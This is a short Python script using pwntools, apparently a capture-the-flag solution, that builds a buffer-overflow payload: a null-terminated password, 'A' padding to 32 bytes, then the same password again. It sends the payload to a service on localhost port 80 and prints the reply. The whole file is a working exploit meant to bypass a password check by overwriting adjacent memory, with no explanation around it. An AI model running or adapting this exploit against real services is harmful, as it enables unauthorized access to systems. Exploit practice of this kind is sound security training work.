from pwn import *

password = b'PASSWORD\x00' # / [a-zA-Z0-9]* \x00 / 

padding = b'A' * (32 - len(password))

payload = password + padding + password

p = remote('localhost', 80)

p.sendline(payload)

print(p.recvall())
